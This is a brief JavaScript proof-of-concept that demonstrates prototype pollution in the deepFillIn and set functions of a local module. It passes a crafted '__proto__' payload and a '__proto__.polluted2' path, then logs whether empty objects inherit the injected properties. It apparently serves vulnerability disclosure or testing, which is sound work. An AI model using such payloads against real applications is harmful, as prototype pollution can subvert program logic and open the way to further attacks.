import * as jsdata from "./utilsmod.js";
var payload = '{"__proto__": {"polluted": "Yes polluted"}}'
console.log("Before : " + {}.polluted);
console.log("Before : " + {}.polluted2);
jsdata.deepFillIn({}, JSON.parse(payload));
jsdata.set({}, '__proto__.polluted2', 'Yes its polluted');
console.log("After : " + {}.polluted);
console.log("After : " + {}.polluted2);
